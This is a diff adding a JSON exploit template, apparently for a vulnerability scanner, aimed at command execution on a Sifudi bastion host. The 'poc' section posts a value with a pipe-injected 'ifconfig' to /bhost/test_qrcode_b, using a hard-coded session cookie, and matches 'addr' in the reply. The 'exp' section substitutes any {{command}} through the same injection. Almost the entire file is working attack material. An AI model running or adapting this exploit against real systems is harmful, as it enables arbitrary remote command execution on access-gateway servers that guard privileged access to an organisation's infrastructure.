@@ -1,0 +1,55 @@
+{
+	"name":"思福迪堡垒机命令执行",
+	"tag":"sifudi",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/bhost/test_qrcode_b",
+		"pocPost":"z1=\"|ifconfig\"&z2=1&z3=1",
+		"header":{
+			"Cookie":" bhost=021EAC95F56C70725FBE8C3B436D25C4",
+			"Accept":" */*",
+			"X-Requested-With":" XMLHttpRequest",
+			"Connection":" close",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36",
+			"Referer":" {{url}}",
+			"Sec-Fetch-Site":" same-origin",
+			"Sec-Fetch-Dest":" empty",
+			"Accept-Encoding":" gzip deflate",
+			"Sec-Fetch-Mode":" cors",
+			"sec-ch-ua":" Not.A/Brand\\;v=\\8\\ \\Chromium\\;v=\\114\\ \\Google Chrome\\;v=\\114\\",
+			"sec-ch-ua-mobile":" ?0",
+			"sec-ch-ua-platform":" Windows",
+			"Accept-Language":" en-USen;q=0.9zh-CN;q=0.8zh;q=0.7",
+			"Content-Length":" 24",
+			"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"(addr)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/bhost/test_qrcode_b",
+			"expPost":"z1=\"|{{command}}\"&z2=1&z3=1",
+			"header":{
+				"Cookie":" bhost=021EAC95F56C70725FBE8C3B436D25C4",
+				"Accept":" */*",
+				"X-Requested-With":" XMLHttpRequest",
+				"Connection":" close",
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/114.0.0.0 Safari/537.36",
+				"Referer":" {{url}}",
+				"Sec-Fetch-Site":" same-origin",
+				"Sec-Fetch-Dest":" empty",
+				"Accept-Encoding":" gzip deflate",
+				"Sec-Fetch-Mode":" cors",
+				"sec-ch-ua":" Not.A/Brand\\;v=\\8\\ \\Chromium\\;v=\\114\\ \\Google Chrome\\;v=\\114\\",
+				"sec-ch-ua-mobile":" ?0",
+				"sec-ch-ua-platform":" Windows",
+				"Accept-Language":" en-USen;q=0.9zh-CN;q=0.8zh;q=0.7",
+				"Content-Length":" 24",
+				"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8"
+			},
+			"status_code":"200",
+			"pattern":"(.*)"
+		}
+	}
+}
